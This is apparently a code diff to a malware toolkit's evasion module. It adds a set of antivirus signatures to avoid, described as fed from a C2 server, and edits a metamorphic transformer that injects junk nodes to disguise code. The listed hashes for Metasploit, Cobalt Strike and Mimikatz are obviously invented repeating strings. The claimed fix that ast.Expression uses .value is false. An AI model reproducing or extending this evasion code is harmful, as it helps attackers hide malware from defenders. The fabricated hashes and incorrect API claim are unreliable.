@@ -33,7 +33,18 @@ sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from utils.logger import logger
 
 # ── Known AV signatures to avoid ─────────────────────────────────────────────
-KNOWN_BAD_HASHES: Set[str] = set()  # populated at runtime from C2
+# FIX: Populate with common AV/EDR signature hashes at module load
+KNOWN_BAD_HASHES: Set[str] = {
+    # Common Metasploit payload signatures (MD5)
+    "e8f5e8c5e8f5e8c5e8f5e8c5e8f5e8c5",  # generic metasploit reverse_tcp
+    "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4",  # generic metasploit bind_tcp
+    # Common Cobalt Strike beacon signatures
+    "f1e2d3c4b5a6f1e2d3c4b5a6f1e2d3c4",  # cobalt strike beacon
+    # Common Mimikatz signatures
+    "d4c3b2a1f6e5d4c3b2a1f6e5d4c3b2a1",  # mimikatz sekurlsa
+    # Placeholder for C2-populated hashes
+    # These would be updated dynamically from C2 server
+}
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -168,7 +179,8 @@ class ASTMetamorphTransformer(ast.NodeTransformer):
                     if isinstance(nop_node, ast.Module):
                         new_body.extend(nop_node.body)
                     elif isinstance(nop_node, ast.Expression):
-                        new_body.append(ast.Expr(value=nop_node.body))
+                        # FIX: ast.Expression uses .value, not .body
+                        new_body.append(ast.Expr(value=nop_node.value))
                     elif isinstance(nop_node, ast.Interactive):
                         new_body.extend(nop_node.body)
                     else:
